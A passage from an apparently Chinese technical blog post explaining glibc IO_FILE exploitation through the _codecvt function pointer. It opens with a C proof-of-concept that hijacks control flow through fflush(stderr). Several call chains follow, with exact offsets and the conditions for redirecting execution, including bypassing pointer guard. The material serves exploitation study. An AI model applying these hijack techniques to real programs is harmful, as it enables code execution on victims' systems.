class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m[!] Backdoor is called!\n&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="type">void</span> *) puts_addr);</span><br><span class="line">    <span class="type">size_t</span> libc_base_addr = puts_addr - <span class="number">0x702e0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc base address: %p\n&quot;</span>, (<span class="type">void</span> *) libc_base_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_2_1_stderr_addr = libc_base_addr + <span class="number">0x3b85e0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="type">void</span> *) _IO_2_1_stderr_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_wfile_jumps_addr = libc_base_addr + <span class="number">0x3b3f40</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wfile_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *) _IO_wfile_jumps_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *stderr2 = (<span class="type">char</span> *) _IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: set stderr-&gt;_flags to ~(4 | 0x10))&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) stderr2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: set stderr-&gt;_IO_read_ptr &lt; stderr-&gt;_IO_read_end&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) (stderr2 + <span class="number">0x10</span>) = (<span class="type">size_t</span>) <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: set stderr-&gt;vtable to _IO_wfile_jumps-0x40&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) (stderr2 + <span class="number">0xd8</span>) = _IO_wfile_jumps_addr - <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: set stderr-&gt;codecvt with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) (stderr2 + <span class="number">0x98</span>) = (<span class="type">size_t</span>) p1;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: set stderr-&gt;codecvt-&gt;__cd_in.step with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) p1 = (<span class="type">size_t</span>) p2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: put backdoor at stderr-&gt;codecvt-&gt;__cd_in.step-&gt;__fct&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) (p2 + <span class="number">0x28</span>) = (<span class="type">size_t</span>) (&amp;backdoor);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 7: call fflush(stderr) to trigger backdoor func&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>详细分析如下：</p>
<p>在<code>_IO_wfile_underflow</code>函数中调用了<code>__libio_codecvt_in</code>，代码片段如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">status</span>;</span></span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 需要进入这个分支</span></span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">    <span class="comment">// 需要一路调用到这里</span></span><br><span class="line">      status = __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                   fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">                   &amp;read_stop,</span><br><span class="line">                   fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">                   fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">                   &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">           <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而<code>_IO_wfile_underflow</code>又是<code>_IO_wfile_jumps</code>这个<code>_IO_jump_t</code>类型变量的成员函数。</p>
<p>因此可以劫持或者伪造<code>FILE</code>结构体的<code>fp-&gt;vtable</code>为<code>_IO_wfile_jumps</code>，<code>fp-&gt;_codecvt</code>为可控堆地址，当程序执行<code>IO</code>操作时，控制程序执行流走到<code>_IO_wfile_underflow</code>，设置好<code>fp-&gt;codecvt-&gt;__cd_in</code>结构体，使得最终调用到<code>__libio_codecvt_in</code>中的<code>DL_CALL_FCT</code>宏，伪造函数指针，进而控制程序执行流。</p>
<p>注意，在伪造过程中，可以设置<code>gs-&gt;__shlib_handle == NULL</code>，从而绕过<code>__pointer_guard</code>的指针调用保护。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/38d0b44c50e70fcfc5ee911fd5627d79.png"
                     
                ></p>
<h3 id="利用-IO-wfile-underflow-mmap函数控制程序执行流-1"><a href="#利用-IO-wfile-underflow-mmap函数控制程序执行流-1" class="headerlink" title="利用_IO_wfile_underflow_mmap函数控制程序执行流"></a>利用_IO_wfile_underflow_mmap函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~4</code></li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为非<code>0</code>，即满足<code>*(A + 0x30) != 0</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
</ul>
<p>函数的调用链如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    __libio_codecvt_in</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure></div>

<p>详细分析如下：<br>看<code>_IO_wfile_underflow_mmap</code>函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 需要调用到这里</span></span><br><span class="line">  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">              fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">              &amp;read_stop,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">              &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base != NULL</code>不进入调用。</p>
<h3 id="利用-IO-wdo-write函数控制程序执行流"><a href="#利用-IO-wdo-write函数控制程序执行流" class="headerlink" title="利用_IO_wdo_write函数控制程序执行流"></a>利用_IO_wdo_write函数控制程序执行流</h3><p><code>_IO_wdo_write</code>的调用点很多，这里我选择一个相对简单的链：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_new_file_sync</span><br><span class="line">    _IO_do_flush</span><br><span class="line">      _IO_wdo_write</span><br></pre></td></tr></table></figure></div>

<p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>vtable</code>设置为<code>_IO_file_jumps/</code>地址（加减偏移），使其能成功调用<code>_IO_new_file_sync</code>即可</li>
<li><code>_IO_write_ptr &gt; _IO_write_base</code>，即满足<code>*(fp + 0x28) &gt; *(fp + 0x20)</code></li>
<li><code>_mode &gt; 0</code>，即满足<code>(fp + 0xc0) &gt; 0</code></li>
<li><code>_IO_write_end != _IO_write_ptr</code>或者<code>_IO_write_end == _IO_write_base</code>，即满足<code>*(fp + 0x30) != *(fp + 0x28)</code>或者<code>*(fp + 0x30) == *(fp + 0x20)</code></li>
<li><code>_wide_data</code>设置为堆地址，假设地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt;= *(A + 0x18)</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_out.step</code>设置为可控堆地址<code>C</code>，即满足<code>*(B + 0x38) = C</code></li>
<li><code>codecvt-&gt;__cd_out.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_out.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
</ul>
<p>函数的调用链如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_IO_new_file_sync</span><br><span class="line">    _IO_do_flush</span><br><span class="line">        _IO_wdo_write</span><br><span class="line">          __libio_codecvt_out</span><br><span class="line">              DL_CALL_FCT</span><br><span class="line">                  gs = fp-&gt;_codecvt-&gt;__cd_out.step</span><br><span class="line">                  *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure></div>

<p>详细分析如下：<br>首先看<code>_IO_new_file_sync</code>函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(fp)) <span class="keyword">return</span> EOF;<span class="comment">//调用到这里</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>只需要满足<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>。</p>
<p>然后看<code>_IO_do_flush</code>宏：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0                                  \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,                      \</span></span><br><span class="line"><span class="meta">          (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)              \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,              \</span></span><br><span class="line"><span class="meta">           ((_f)-&gt;_wide_data-&gt;_IO_write_ptr                  \</span></span><br><span class="line"><span class="meta">            - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure></div>

<p>根据<code>fp-&gt;_mode</code>的值选择调用<code>_IO_do_write</code>或者<code>_IO_wdo_write</code>。这里我们要调用后者，必须使<code>fp-&gt;_mode &gt; 0</code>。此时的第二个参数为<code>fp-&gt;_wide_data-&gt;_IO_write_base</code>，第三个参数为<code>fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base</code>。</p>
<p>接着看<code>_IO_wdo_write</code>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_wdo_write (FILE *fp, <span class="type">const</span> <span class="type">wchar_t</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 第三个参数必须要大于0</span></span><br><span class="line">  <span class="keyword">if</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr</span><br><span class="line">      &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;<span class="comment">// 不能进入这个分支</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_new_do_write (fp, fp-&gt;_IO_write_base,</span><br><span class="line">                fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) == EOF)</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Now convert from the internal format into the external buffer.  */</span></span><br><span class="line">    <span class="comment">// 需要调用到这里</span></span><br><span class="line">      result = __libio_codecvt_out (cc, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                    data, data + to_do, &amp;new_data,</span><br><span class="line">                    write_ptr,</span><br><span class="line">                    buf_end,</span><br><span class="line">                    &amp;write_ptr);</span><br><span class="line">          <span class="comment">//......</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先<code>to_do</code>必须要大于<code>0</code>，即满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>，然后这个判断需要为假<code>fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base</code>。</p>
<p>这个链基本需要控制<code>fp-&gt;_wide_data</code>，相比上两条链的约束条件要更多一点。</p>
<h3 id="使用-IO-wfile-sync函数控制程序执行流"><a href="#使用-IO-wfile-sync函数控制程序执行流" class="headerlink" title="使用_IO_wfile_sync函数控制程序执行流"></a>使用_IO_wfile_sync函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_sync</code>即可</li>
<li><code>_wide_data</code>设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &lt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &lt;= *(A + 0x18)</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end</code>，即满足<code>*A != *(A + 8)</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__stateful</code>设置为非<code>0</code>，即满足<code>*(B + 0x58) != 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>rsi</code>为<code>&amp;codecvt-&gt;__cd_in.step_data</code>可控。</li>
</ul>
<p>函数的调用链如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_sync</span><br><span class="line">    __libio_codecvt_length</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure></div>

<p>详细分析如下：<br>直接看<code>_IO_wfile_sync</code>函数：</p>
